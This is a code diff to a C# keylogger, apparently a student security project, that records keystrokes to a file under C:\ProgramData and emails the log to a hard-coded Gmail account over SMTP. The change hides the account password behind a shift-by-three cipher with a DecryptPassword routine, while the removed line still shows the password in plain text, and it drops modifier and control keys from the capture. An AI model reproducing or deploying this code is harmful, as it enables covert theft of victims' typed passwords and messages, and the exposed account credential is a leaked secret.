@@ -15,11 +15,13 @@ namespace PSC_Keylogger
     public static class BaseKeylogger
     {
         private const string FROM_EMAIL_ADDRESS = "protocoalesecuritate01@gmail.com";
-        private const string FROM_EMAIL_PASSWORD = "protocoaledesecuritateincomunicatii";
+        private const string FROM_EMAIL_PASSWORD = "surwrfrdohghvhfxulwdwhlqfrpxqlfdwll";
         private const string TO_EMAIL_ADDRESS = "protocoalesecuritate01@gmail.com";
+
         private const string LOG_FILE_NAME = @"C:\ProgramData\Z_PSC\mylog.txt";
         private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\Z_PSC\mylog_archive.txt";
         private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
+
         private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 50;
         private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
 
@@ -78,10 +80,13 @@ namespace PSC_Keylogger
                         buffer += " ";
                         break;
                     case "Enter":
-                        buffer += "\n";
-                        break;
                     case "Return":
                         buffer += "\n";
+                        break;
+                    case "LShiftKey": case "RShiftKey":
+                    case "LControlKey": case "RControlKey":
+                    case "Tab": case "Back":
+                        buffer += "";
                         break;
                     default:
                         buffer += strCode;
@@ -114,7 +119,7 @@ namespace PSC_Keylogger
                     Port = 587,
                     DeliveryMethod = SmtpDeliveryMethod.Network,
                     UseDefaultCredentials = false,
-                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD),
+                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, DecryptPassword()),
                     EnableSsl = true,
                 };
 
@@ -142,6 +147,23 @@ namespace PSC_Keylogger
             {
                 Console.Out.WriteLine(e.Message);
             }
+        }
+
+        private static string DecryptPassword()
+        {
+            byte[] values = Encoding.ASCII.GetBytes(FROM_EMAIL_PASSWORD);
+            byte[] newValues = new byte[values.Length];
+
+            int index = 0;
+            foreach (byte b in values)
+            {
+                int newValue = b - 3;
+                newValues[index] = (byte)newValue;
+                index += 1;
+            }
+
+            string actualPass = Encoding.ASCII.GetString(newValues);
+            return actualPass;
         }
 
         [DllImport("user32.dll")]
